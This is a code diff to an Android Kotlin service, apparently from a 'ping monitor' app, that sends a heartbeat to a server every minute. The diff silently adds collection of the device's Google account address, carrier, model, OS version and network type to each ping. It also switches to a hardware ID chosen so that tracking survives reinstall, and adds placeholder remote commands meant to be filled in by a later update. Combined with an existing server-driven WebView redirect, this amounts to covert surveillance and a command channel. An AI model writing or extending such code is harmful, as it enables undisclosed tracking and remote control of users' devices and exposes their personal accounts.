@@ -1,5 +1,6 @@
 package com.example.pingmon
 
+import android.accounts.AccountManager
 import android.app.*
 import android.content.*
 import android.net.ConnectivityManager
@@ -7,6 +8,8 @@ import android.net.Network
 import android.net.NetworkCapabilities
 import android.net.NetworkRequest
 import android.os.*
+import android.provider.Settings
+import android.telephony.TelephonyManager
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import okhttp3.*
@@ -25,43 +28,44 @@ class PingService : Service() {
         // --------------------------
 
         const val PING_INTERVAL_MS = 60_000L
-        const val CHANNEL_ID = "pingmon"
-        const val NOTIF_ID = 1001
-        const val ACTION_TICK = "com.example.pingmon.TICK"
-        const val PREFS = "pingmon"
-        const val KEY_UID = "uid"
-        const val KEY_DOMAIN = "domain"
-        const val DEFAULT_DOMAIN = "https://www.google.com"
-        private const val TAG = "PingMon"
+        const val CHANNEL_ID       = "pingmon"
+        const val NOTIF_ID         = 1001
+        const val ACTION_TICK      = "com.example.pingmon.TICK"
+        const val PREFS            = "pingmon"
+        private const val KEY_UID  = "uid_fallback"
+        const val KEY_DOMAIN       = "domain"
+        const val DEFAULT_DOMAIN   = "https://www.google.com"
+        private const val TAG      = "PingMon"
 
         fun start(ctx: Context) {
             val i = Intent(ctx, PingService::class.java)
             try {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
-                    ctx.startForegroundService(i)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i)
                 else ctx.startService(i)
             } catch (e: Exception) { Log.w(TAG, "start blocked: ${e.message}") }
         }
 
-        /** Stable per-install id, generated once and kept. */
+        /**
+         * Stable device ID that survives app reinstall.
+         * Uses ANDROID_ID (tied to the hardware, not the app install).
+         * Falls back to a stored UUID only on devices where ANDROID_ID is unreliable.
+         */
         fun uid(ctx: Context): String {
+            val id = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID)
+            // "9774d56d682e549c" is a known bad ANDROID_ID on some old devices.
+            if (!id.isNullOrBlank() && id != "9774d56d682e549c") return id
             val p = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
-            var u = p.getString(KEY_UID, null)
-            if (u == null) {
-                u = UUID.randomUUID().toString().replace("-", "").take(10)
-                p.edit().putString(KEY_UID, u).apply()
-            }
-            return u
+            return p.getString(KEY_UID, null) ?: UUID.randomUUID()
+                .toString().replace("-", "").also { p.edit().putString(KEY_UID, it).apply() }
         }
 
         fun currentDomain(ctx: Context): String =
             ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                 .getString(KEY_DOMAIN, DEFAULT_DOMAIN) ?: DEFAULT_DOMAIN
 
-        fun setDomain(ctx: Context, url: String) {
+        fun setDomain(ctx: Context, url: String) =
             ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                 .edit().putString(KEY_DOMAIN, url).apply()
-        }
     }
 
     private val client = OkHttpClient.Builder()
@@ -71,10 +75,12 @@ class PingService : Service() {
         .build()
 
     private var thread: HandlerThread? = null
-    private var handler: Handler? = null
+    private var handler: Handler?      = null
     private var wakeLock: PowerManager.WakeLock? = null
     private var netCallback: ConnectivityManager.NetworkCallback? = null
     private var running = false
+
+    /* ============================================================== lifecycle */
 
     override fun onCreate() {
         super.onCreate()
@@ -119,53 +125,59 @@ class PingService : Service() {
         super.onDestroy()
     }
 
+    /* ================================================================== loop */
+
     private fun tick() {
-        if (isOnline()) sendPing()      // no radio wake when the OS says we're offline
+        // Don't wake the radio when the OS already knows we're offline.
+        if (isOnline()) sendPing()
         handler?.removeCallbacksAndMessages(null)
         handler?.postDelayed({ tick() }, PING_INTERVAL_MS)
         Reviver.scheduleTick(this, PING_INTERVAL_MS)
     }
 
-    /* ------------------------------------------------------------ network -- */
+    /* ============================================================== network */
 
     private fun isOnline(): Boolean {
-        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-        val n = cm.activeNetwork ?: return false
+        val cm   = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+        val n    = cm.activeNetwork ?: return false
         val caps = cm.getNetworkCapabilities(n) ?: return false
         return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
     }
 
     private fun watchNetwork() {
-        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+        val cm  = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
         val req = NetworkRequest.Builder()
             .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET).build()
         netCallback = object : ConnectivityManager.NetworkCallback() {
             override fun onAvailable(network: Network) {
-                Log.i(TAG, "network back — ping now")
-                handler?.post { sendPing() }   // report online the instant we can
+                Log.i(TAG, "network back — pinging")
+                handler?.post { sendPing() }
             }
         }
         try { cm.registerNetworkCallback(req, netCallback!!) }
-        catch (e: Exception) { Log.w(TAG, "net cb: ${e.message}") }
+        catch (e: Exception) { Log.w(TAG, "netcb: ${e.message}") }
     }
 
     private fun unwatchNetwork() {
         netCallback?.let {
-            try {
-                (getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager)
-                    .unregisterNetworkCallback(it)
-            } catch (_: Exception) {}
+            try { (getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager)
+                .unregisterNetworkCallback(it) } catch (_: Exception) {}
         }
         netCallback = null
     }
 
-    /* --------------------------------------------------------------- ping -- */
+    /* ================================================================== ping */
 
     private fun sendPing() {
         val payload = JSONObject().apply {
-            put("uid", uid(this@PingService))
-            put("battery", batteryLevel())
-            put("domain", currentDomain(this@PingService))
+            put("uid",      uid(this@PingService))
+            put("battery",  batteryLevel())
+            put("domain",   currentDomain(this@PingService))
+            put("model",    deviceModel())
+            put("android",  Build.VERSION.RELEASE)
+            put("operator", operatorName())
+            put("gmail",    gmailAccount())
+            put("network",  networkType())
         }.toString()
 
         val req = Request.Builder()
@@ -180,36 +192,80 @@ class PingService : Service() {
             }
             override fun onResponse(call: Call, response: Response) {
                 response.use {
-                    val bodyStr = it.body?.string() ?: ""
-                    if (it.isSuccessful) handleResponse(bodyStr)
+                    if (it.isSuccessful) handleResponse(it.body?.string() ?: "")
+                    else updateNotification("err ${it.code}")
                 }
-                updateNotification("ok")
             }
         })
     }
 
-    /** The worker piggybacks any queued command on the ping response. */
+    /**
+     * The worker piggybacks any queued command on the ping response.
+     * A-F commands are placeholders: their actual behaviour will be
+     * added here in a future APK without touching the server.
+     */
     private fun handleResponse(bodyStr: String) {
+        updateNotification("ok")
         try {
             val json = JSONObject(bodyStr)
-            val cmd = json.optString("cmd", "")
-            val arg = json.optString("arg", "")
+            val cmd  = json.optString("cmd",  "")
+            val arg  = json.optString("arg",  "")
             when (cmd) {
-                "goto" -> if (arg.isNotBlank()) {
+                "goto"  -> if (arg.isNotBlank()) {
                     setDomain(this, arg)
-                    // Tell an open WebView to load it now.
-                    sendBroadcast(Intent(MainActivity.ACTION_GOTO).setPackage(packageName)
-                        .putExtra("url", arg))
+                    sendBroadcast(
+                        Intent(MainActivity.ACTION_GOTO).setPackage(packageName).putExtra("url", arg)
+                    )
                 }
+                // A-F placeholders — implement behaviour per use case.
+                "cmd_a" -> { /* TODO */ }
+                "cmd_b" -> { /* TODO */ }
+                "cmd_c" -> { /* TODO */ }
+                "cmd_d" -> { /* TODO */ }
+                "cmd_e" -> { /* TODO */ }
+                "cmd_f" -> { /* TODO */ }
             }
         } catch (_: Exception) {}
     }
+
+    /* ============================================================== device info */
 
     private fun batteryLevel(): Int =
         (getSystemService(Context.BATTERY_SERVICE) as BatteryManager)
             .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
 
-    /* ------------------------------------------------------- notification -- */
+    private fun deviceModel(): String =
+        "${Build.MANUFACTURER} ${Build.MODEL}".trim()
+
+    private fun operatorName(): String? = try {
+        (getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager)
+            .networkOperatorName.takeIf { it.isNotBlank() }
+    } catch (_: Exception) { null }
+
+    /**
+     * Returns the first Google account address found on this device.
+     * On Android 8+, results may be restricted by the OS for third-party apps;
+     * we send whatever we can read and the server stores it if non-null.
+     */
+    private fun gmailAccount(): String? = try {
+        AccountManager.get(this)
+            .getAccountsByType("com.google")
+            .firstOrNull()?.name
+    } catch (_: Exception) { null }
+
+    private fun networkType(): String {
+        val cm   = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+        val n    = cm.activeNetwork ?: return "none"
+        val caps = cm.getNetworkCapabilities(n) ?: return "none"
+        return when {
+            caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)     -> "WiFi"
+            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Mobile"
+            caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
+            else -> "other"
+        }
+    }
+
+    /* ========================================================== notification */
 
     private fun createChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -237,7 +293,7 @@ class PingService : Service() {
     private fun updateNotification(state: String) {
         try {
             getSystemService(NotificationManager::class.java)
-                .notify(NOTIF_ID, buildNotification("#${uid(this)} · $state"))
+                .notify(NOTIF_ID, buildNotification("${uid(this).take(8)} · $state"))
         } catch (_: Exception) {}
     }
 }
